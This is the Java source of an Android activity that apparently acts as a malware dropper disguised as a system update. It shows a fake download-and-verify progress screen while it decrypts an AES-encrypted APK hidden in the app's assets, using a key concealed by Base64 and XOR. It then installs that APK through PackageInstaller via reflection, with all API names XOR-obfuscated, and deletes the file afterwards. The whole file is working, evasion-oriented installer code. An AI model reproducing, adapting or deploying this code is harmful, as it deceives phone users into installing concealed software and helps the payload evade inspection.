package com.base.util.apps;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {

    private static final char[] _AC={0x14,0x10,0x06,0x7a,0x16,0x17,0x16,0x7a,0x05,0x1e,0x16,0x06,0x60,0x05,0x34,0x31,0x31,0x3c,0x3b,0x32};
    private static final char[] _AE={0x14,0x10,0x06};
    private static final char[] _PI={0x34,0x3b,0x31,0x27,0x3a,0x3c,0x31,0x7b,0x36,0x3a,0x3b,0x21,0x30,0x3b,0x21,0x7b,0x25,0x38,0x7b,0x05,0x34,0x36,0x3e,0x34,0x32,0x30,0x1c,0x3b,0x26,0x21,0x34,0x39,0x39,0x30,0x27};
    private static final char[] _SP={0x34,0x3b,0x31,0x27,0x3a,0x3c,0x31,0x7b,0x36,0x3a,0x3b,0x21,0x30,0x3b,0x21,0x7b,0x25,0x38,0x7b,0x05,0x34,0x36,0x3e,0x34,0x32,0x30,0x1c,0x3b,0x26,0x21,0x34,0x39,0x39,0x30,0x27,0x71,0x06,0x30,0x26,0x26,0x3c,0x3a,0x3b,0x05,0x34,0x27,0x34,0x38,0x26};
    private static final char[] _GI={0x32,0x30,0x21,0x05,0x34,0x36,0x3e,0x34,0x32,0x30,0x1c,0x3b,0x26,0x21,0x34,0x39,0x39,0x30,0x27};
    private static final char[] _CS={0x36,0x27,0x30,0x34,0x21,0x30,0x06,0x30,0x26,0x26,0x3c,0x3a,0x3b};
    private static final char[] _OS={0x3a,0x25,0x30,0x3b,0x06,0x30,0x26,0x26,0x3c,0x3a,0x3b};
    private static final char[] _OW={0x3a,0x25,0x30,0x3b,0x02,0x27,0x3c,0x21,0x30};
    private static final char[] _FS={0x33,0x26,0x2c,0x3b,0x36};
    private static final char[] _CM={0x36,0x3a,0x38,0x38,0x3c,0x21};
    private static final char[] _PK={0x25,0x3e,0x32};
    private static final char[] _ES={0x34,0x3b,0x31,0x27,0x3a,0x3c,0x31,0x7b,0x36,0x3a,0x3b,0x21,0x30,0x3b,0x21,0x7b,0x25,0x38,0x7b,0x30,0x2d,0x21,0x27,0x34,0x7b,0x06,0x01,0x14,0x01,0x00,0x06};
    private static final char[] _EI={0x34,0x3b,0x31,0x27,0x3a,0x3c,0x31,0x7b,0x3c,0x3b,0x21,0x30,0x3b,0x21,0x7b,0x30,0x2d,0x21,0x27,0x34,0x7b,0x1c,0x1b,0x01,0x10,0x1b,0x01};

    private static final int K = 0x55;
    private static String x(char[] c) {
        char[] r = c.clone();
        for (int i = 0; i < r.length; i++) r[i] ^= K;
        return new String(r);
    }

    private static final String TAG      = "SysUpd";
    private static final String ASSET    = "core.dat";
    private static final String OUT_FILE = "pkg.apk";

    private ProgressBar       progress;
    private TextView          tvStatus, tvPct;
    private File              outApk;
    private String            installAction;
    private BroadcastReceiver installReceiver;
    private final Handler     ui = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        progress = findViewById(R.id.progress);
        tvStatus = findViewById(R.id.tv_status);
        tvPct    = findViewById(R.id.tv_pct);

        installAction = getPackageName() + ".IS";
        installReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context ctx, Intent intent) {
                int st = intent.getIntExtra(x(_ES), -99);
                if (st == 0) {
                    setStatus("Update complete", 100);
                    ui.postDelayed(MainActivity.this::finish, 1200);
                } else if (st == -1) {
                    Intent confirm = intent.getParcelableExtra(x(_EI));
                    if (confirm != null) startActivity(confirm);
                } else {
                    finish();
                }
            }
        };

        IntentFilter f = new IntentFilter(installAction);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(installReceiver, f, RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(installReceiver, f);
        }
        animateProgress();
    }

    private void animateProgress() {
        final int[] step = {0};
        Runnable tick = new Runnable() {
            @Override public void run() {
                step[0] += 4;
                if (step[0] <= 60) {
                    setStatus("Downloading update...", step[0]);
                    ui.postDelayed(this, 80);
                } else if (step[0] == 64) {
                    setStatus("Verifying package...", step[0]);
                    new Thread(MainActivity.this::doInstall).start();
                }
            }
        };
        ui.postDelayed(tick, 400);
    }

    private void doInstall() {
        try {
            outApk = new File(getFilesDir(), OUT_FILE);
            decrypt(ASSET, getKey(), outApk);
            ui.post(() -> setStatus("Installing...", 85));
            runOnUiThread(this::startSession);
        } catch (Exception e) {
            Log.e(TAG, "e", e);
            runOnUiThread(this::finish);
        }
    }

    private static byte[] getKey() {
        String _ek = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38=";
        byte[] xk  = android.util.Base64.decode(_ek, android.util.Base64.DEFAULT);
        for (int i = 0; i < xk.length; i++) xk[i] ^= 0x55;
        return xk;
    }

    private void decrypt(String asset, byte[] key, File out) throws Exception {
        try (InputStream in  = getAssets().open(asset);
             FileOutputStream fos = new FileOutputStream(out)) {
            byte[] iv = new byte[16]; int got = 0;
            while (got < 16) {
                int r = in.read(iv, got, 16 - got);
                if (r < 0) throw new IOException("short");
                got += r;
            }
            Cipher c = Cipher.getInstance(x(_AC));
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, x(_AE)), new IvParameterSpec(iv));
            byte[] buf = new byte[65536]; int n;
            while ((n = in.read(buf)) > 0) fos.write(c.update(buf, 0, n));
            fos.write(c.doFinal());
        }
    }

    @SuppressWarnings("unchecked")
    private void startSession() {
        try {
            Object   pm  = getPackageManager();
            Object   pi  = pm.getClass().getMethod(x(_GI)).invoke(pm);
            Class<?> spc = Class.forName(x(_SP));
            Object   sp  = spc.getConstructor(int.class).newInstance(1);
            int      sid = (int) pi.getClass().getMethod(x(_CS), spc).invoke(pi, sp);
            Object   ses = pi.getClass().getMethod(x(_OS), int.class).invoke(pi, sid);

            Method mOW = ses.getClass().getMethod(x(_OW), String.class, long.class, long.class);
            try (OutputStream out = (OutputStream) mOW.invoke(ses, x(_PK), 0L, outApk.length());
                 FileInputStream fis = new FileInputStream(outApk)) {
                byte[] buf = new byte[65536]; int n;
                while ((n = fis.read(buf)) > 0) out.write(buf, 0, n);
                ses.getClass().getMethod(x(_FS), OutputStream.class).invoke(ses, out);
            }

            PendingIntent pi2 = PendingIntent.getBroadcast(
                this, sid,
                new Intent(installAction).setPackage(getPackageName()),
                PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= 31 ? PendingIntent.FLAG_MUTABLE : 0));
            IntentSender sender = pi2.getIntentSender();
            ses.getClass().getMethod(x(_CM), IntentSender.class).invoke(ses, sender);
            ((java.io.Closeable) ses).close();
        } catch (Exception e) {
            Log.e(TAG, "ses", e);
            finish();
        }
    }

    private void setStatus(String msg, int pct) {
        tvStatus.setText(msg);
        progress.setProgress(pct);
        tvPct.setText(pct + "%");
    }

    @Override protected void onDestroy() {
        super.onDestroy();
        if (outApk != null) outApk.delete();
        try { unregisterReceiver(installReceiver); } catch (Exception ignored) {}
    }
}
